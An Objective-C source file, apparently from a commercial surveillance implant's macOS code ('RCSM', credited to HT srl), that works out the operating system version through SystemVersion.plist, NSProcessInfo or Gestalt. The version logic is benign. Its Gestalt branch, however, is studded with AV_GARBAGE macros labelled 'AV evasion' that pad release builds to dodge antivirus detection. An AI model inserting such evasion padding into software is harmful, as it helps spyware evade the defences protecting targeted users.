/*
 * NSApplication category - Method for systemVersion
 *
 *  http://www.cocoadev.com/index.pl?DeterminingOSVersion
 *   # Cocoa Code for Gestalt
 *
 * Created by Alfredo 'revenge' Pesoli on 21/06/2010
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "NSApplication+SystemVersion.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

typedef struct {
  NSInteger majorVersion;
  NSInteger minorVersion;
  NSInteger patchVersion;
} MyOperatingSystemVersion;

@implementation NSApplication (SystemVersion)

- (void)getSystemVersionMajor: (u_int *)major
                        minor: (u_int *)minor
                       bugFix: (u_int *)bugFix
{
  // Fix for Gestalt exception on yosemite
  NSDictionary *Dictionary =
  [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/CoreServices/SystemVersion.plist"];
  
  if (Dictionary != nil)
  {
    NSString *actualVersion = [Dictionary objectForKey:@"ProductVersion"];
    
    if (actualVersion != nil)
    {
      NSString *currVer = nil;
      NSArray *versionStrings = [actualVersion componentsSeparatedByString:@"."];
      
      int numVersions = [versionStrings count];
      
      currVer = [versionStrings objectAtIndex:0];
      *major = atoi([currVer cStringUsingEncoding:NSUTF8StringEncoding]);
      
      currVer = [versionStrings objectAtIndex:1];
      *minor = atoi([currVer cStringUsingEncoding:NSUTF8StringEncoding]);
      
      if (numVersions > 2)
      {
        currVer = [versionStrings objectAtIndex:2];
        *bugFix = atoi([currVer cStringUsingEncoding:NSUTF8StringEncoding]);
      }
    }
  }
  else if ([[NSProcessInfo processInfo] respondsToSelector:@selector(operatingSystemVersion)])
  {
    MyOperatingSystemVersion version =
      ((MyOperatingSystemVersion(*)(id, SEL))objc_msgSend_stret)([NSProcessInfo processInfo], @selector(operatingSystemVersion));
    
    *major = version.majorVersion; *minor = version.minorVersion; *bugFix = version.patchVersion;
  
    return;
  }
  else
  {
    
    *major = 10; *minor = 0; *bugFix = 0;

    // AV evasion: only on release build
    AV_GARBAGE_000
    OSErr err;
    SInt32 systemVersion, versionMajor, versionMinor, versionBugFix;
   
    err = Gestalt(gestaltSystemVersion, &systemVersion);
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    if (err == noErr && systemVersion < 0x1040)
      {   
        // AV evasion: only on release build
        AV_GARBAGE_002
      
        if (major)
          *major = ((systemVersion & 0xF000) >> 12) * 10
                    + ((systemVersion & 0x0F00) >> 8);
      
        // AV evasion: only on release build
        AV_GARBAGE_003
      
        if (minor)
          *minor = (systemVersion & 0x00F0) >> 4;
        
        // AV evasion: only on release build
        AV_GARBAGE_006
        
        if (bugFix)
          *bugFix = (systemVersion & 0x000F);    
        
        // AV evasion: only on release build
        AV_GARBAGE_008
      }
    else
      {
        err = Gestalt(gestaltSystemVersionMajor, &versionMajor);
        
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        err = Gestalt(gestaltSystemVersionMinor, &versionMinor);
        
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        err = Gestalt(gestaltSystemVersionBugFix, &versionBugFix);
        
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        if (err == noErr)
          {
            if (major)
              *major = versionMajor;
            
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            if (minor)
              *minor = versionMinor;
            
            // AV evasion: only on release build
            AV_GARBAGE_004
            
            if (bugFix)
              *bugFix = versionBugFix;
            
            // AV evasion: only on release build
            AV_GARBAGE_005
            
          }
      }
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    if (err != noErr)
      {   
        // AV evasion: only on release build
        AV_GARBAGE_002
      
        
        if (major)
          *major = 10; 
        
        // AV evasion: only on release build
        AV_GARBAGE_009
        
        if (minor)
          *minor = 0;   
        
        // AV evasion: only on release build
        AV_GARBAGE_008
        
        if (bugFix)
          *bugFix = 0;
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
      }
  }
}

@end